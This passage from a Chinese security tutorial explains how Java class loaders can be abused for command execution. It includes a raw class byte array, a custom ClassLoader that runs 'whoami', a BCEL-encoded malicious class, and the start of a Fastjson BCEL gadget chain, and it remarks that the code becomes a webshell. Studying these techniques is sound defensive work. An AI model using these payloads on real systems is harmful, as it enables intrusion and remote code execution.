class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">85</span>, <span class="number">84</span>, <span class="number">70</span>, <span class="number">95</span>, <span class="number">56</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">84</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">61</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">43</span>, <span class="number">77</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">78</span>, <span class="number">45</span>, <span class="number">18</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">5</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">77</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">45</span>, <span class="number">18</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">5</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">77</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">61</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">44</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">78</span>, <span class="number">0</span>, <span class="number">13</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">7</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">58</span>, <span class="number">8</span>, <span class="number">25</span>, <span class="number">8</span>, -<span class="number">80</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">1</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">4</span>, -<span class="number">3</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">114</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">50</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理 x类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(TEST_CLASS_NAME)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native去加载 x类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, <span class="number">0</span>, TEST_CLASS_BYTES.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的classloader</span></span><br><span class="line">        ZeoClassLoader loader = <span class="keyword">new</span> ZeoClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载x类</span></span><br><span class="line">            Class testClass = loader.loadClass(TEST_CLASS_NAME);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取构造方法</span></span><br><span class="line">            Constructor constructor = testClass.getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射实例化，等价于 Command t = new Command();</span></span><br><span class="line">            Object runtimeInstance = constructor.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射获取 execute 方法</span></span><br><span class="line">            Method method = testClass.getMethod(<span class="string">"execute"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射调用 execute 方法, 等价于 t.execute(cmd);</span></span><br><span class="line">            BufferedReader br = (BufferedReader) method.invoke(runtimeInstance, <span class="string">"whoami"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取结果</span></span><br><span class="line">            String line=<span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line=br.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/f7a818fca375e7c4bd0eccc4d09b0b58.png" alt="image-20220509160331973"></p><p>再然后就把这个重新封精简一些，写到jsp那不就是个webshell了吗</p><h1 id="0x03-BCEL"><a href="#0x03-BCEL" class="headerlink" title="0x03 BCEL"></a>0x03 BCEL</h1><h2 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h2><p><a href="https://commons.apache.org/proper/commons-bcel/" target="_blank" rel="noopener">BCEL</a>（<code>Apache Commons BCEL™</code>）是一个用于分析、创建和操纵Java类文件的工具库。</p><p>BCEL的类加载器在解析类名时，会对ClassName中有<code>$$BCEL$$</code>标识的类名做特殊处理，导致恶意加载类。</p><h3 id="BCEL攻击原理"><a href="#BCEL攻击原理" class="headerlink" title="BCEL攻击原理"></a>BCEL攻击原理</h3><p>当BCEL的加载一个类名中带有<code>$$BCEL$$</code>的类时，会截取出前面的<code>$$BCEL$$</code>后面的字符串，然后使用<code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code>这个方法把后面的将字符串解析成类字节码，所以我们可以把恶意类转化成这种形式，最后会调用<code>defineClass</code>加载恶意类，达到攻击效果</p><h2 id="BCEL版本"><a href="#BCEL版本" class="headerlink" title="BCEL版本"></a>BCEL版本</h2><p>Oracle JDK引用了BCEL库，不过修改了原包名</p><p><code>org.apache.bcel.util.ClassLoader</code>为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p><p>适用于BCEL 6.0以下</p><p>DK版本为：<code>JDK1.5 \- 1.7</code>、<code>JDK8 \- JDK8u241</code>、<code>JDK9</code>。</p><h2 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h2><p>写个命令执行的方法看看</p><p>利用BCELClassLoader加载恶意类，实现命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.bcel.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> org.apache.bcel.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BCELClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bcel</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建BCEL类加载器</span></span><br><span class="line">        ClassLoader classLoader = <span class="keyword">new</span> ClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// BCEL编码类字节码</span></span><br><span class="line">        String className = <span class="string">"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85TmS$hU$Y$3d$97$bc$ec$b2$y$q$qB$J$f5$r$a8m$D$b4$89$d6jk$8a$a8$8dE$90$A5$a1P$daj$e7fs$L$5b7$bb$99$dd$8d$d2$9f$e2$_$e8$e7$fa$B$3av$c6$l$e0$3f$f2$83$8eg$93$94$UI$c7L$e6$d9$7d$ce$f3$7e$9e$bb$f7$cf$7f$7e$ff$D$c05$3c20$85$8fu$5c$d5$f1$89A$fdS$j$9f$Z$b8$8e$h$3a$3e$d7Q$d6q$d3$c0$S$be$88$c4$b2$81$_$f1$95$86$afGq$L$V$D$e3$f8F$c3m$Di$ach$f8$d6$40$G$ab$g$d64$7c$t$90$5c$b2$5d$3b$5c$W$88$V$e6w$E$e2$V$af$a9$ERU$dbU$9b$9dVC$f9$db$b2$e1$Q$c9T$3dK$3a$3b$d2$b7$p$bd$P$c6$c3$D$3b$88l$96$d7$w5$y$e5$94$w$5e$ab$r$dd$e6M$B$7d$c9r$fa$a9$b5$b6$efY$w$a0g$b6$faD$fe$yK$8et$f7Kwz$m$5dGlW$60$aag$b2$bd$d2$9a$db$ee$84$f5$d0W$b2E$e3$98$3dP$d9$a5$j$f8$C$e7$87$f9$d6$94l$w$3fJ$d7$a0$cb$cc$89$cb$ad$ce$e3$c7$caW$cd$T$bbP$a7$aam$dd$3e$b4T$3b$b4$3d$976$cd$ea$N$Q$N5h$95$Flw$9f$e6$a4$Xl$ca$W$e3$c7$eb$a1$b4$7e$da$90$ed$$$T$g$d6$c9$ab$80Q$f7$3a$be$a5V$ec$88$i$b3$cfE1$cacb$g$e7$E$a6$bd$b6r$f3Wd$be$o$j$ab$e3$c8$d0$f3$8b$b2$ddf$5d$_$u$ba$cc$ac$a1jb$D$9bDvm$b7$e9$fd$S0$b7$89$z$dc$n$db$5c$80$r$90$e0n$3a$87$Ci$ab$e3$3b$f9$a6$h8$de$7e1Z$80$86$efM$d4P7$b1$8d$bb$gvL$ec$e2$9e$40$ee$8d$5ci$d83q$l$P$a2$e6$k$b2$b9$e1$8cE$d6$l$b8$ba$n$84$99$f81$9a$w$fd$df$f5$T$g$90$b7$d5x$a2$ac$f0$U$d4$e3$f34$f44$I$V$X$3c$b6$afB$9e$8c$b6$f2$c3$a7$C$X$Lg$b70$3fl1F$QJ$3f$Mv$ed$f0$80$cb$j$Wu_$60r$80$d6$3anhG$8b4X$efD$99$w$bc$9e$bc$P3$7b$5c$j$w2$7f$e9$7f$ba$Z$9c$e8$c93$a0$c0$E$x$ad$bd$7e$96$cf$bd$aav$e6$cc$cfua$97$b8u$m$fd$40$85$acFZ$a5$df$ac$f4t$a6K$dc$dd$5eytC$60$b6z$c6$b9$ef$c4DW$LC$x$bc9$q$ba$D$b2$83$a0$fe7$T$a1$a96$e7$N$bb$c7$7e$db$97$96$c2$i$de$e2$85$U$fdF$m$a2$e3M9C$ad$c4$a7$e03$b1p$M$f1$bck$ceQ$s$bb$e0$uf$v$cd$9e$D$ce$e3m$3eu$bc$f3$wX$5c$40$i$g$b1$87$99$91$f5L$ec$F$e2$d5$c5L$e2$I$c9_1$9a$d1$d6$9fae1$a3$f7$d5Q$aa$d7_$c0X8$c2$d8$c6$e5$p$98$9b$91$u$c7_b$7c$_$X$ff$N$T$c7H$95$T$_$91$de$cb$r$8e1YN$3e$83$k$f9e$9f$b3$d6$r$d4$b1$c3$7b0$d6$edm$Z$v$ca1j$e3$ec0E$3c$cdn2$i1K$cfi$8e4$c3$Lw$We$f6$bb$8aw$Z$fb$3e$a3$f3$fc$be$e6$f0$A$X$bb3$d58G$J$l$d2$fa$k$t$beF$99$a75$c6$98$i$bd$e78$d7$w$x$7c$40$8f$E$e3$81$L$8cK2C$9c$V$K$8c$88$e1$k$e6$b1$d0$e5$a8$86E$be$J$5c$a6$96E$fco$cch$b8$c2$ff$84$ab$a1$f8$XC$EKE$c4$7e$f4$_$af$pH$dd$k$G$A$A"</span>;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(className, <span class="keyword">true</span>, classLoader);</span><br><span class="line"></span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        bcel();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://img-blog.csdnimg.cn/img_convert/20cb6ff2dec7b695362e8c83dd6bd1ce.png" alt="image-20220509170903092"></p><p>同理，改成jsp格式的，也是一个webshell。</p><h1 id="0x04-BCEL-Fastjson-应用"><a href="#0x04-BCEL-Fastjson-应用" class="headerlink" title="0x04 BCEL Fastjson 应用"></a>0x04 BCEL Fastjson 应用</h1><p>在fastjson中主要是通过 <code>org.apache.commons.dbcp.BasicDataSource</code>类来出发BECL的类加载器</p><p>首先发送payload：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/092dc44a375fae97c3e4dc6f225f8cda.png" alt="image-20220509191509212"></p><p>1、FastJson自动调用setter方法修改<code>org.apache.commons.dbcp.BasicDataSource</code>类的<code>driverClassName</code>和<code>driverClassLoader</code>值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其中</span><br><span class="line">driverClassName 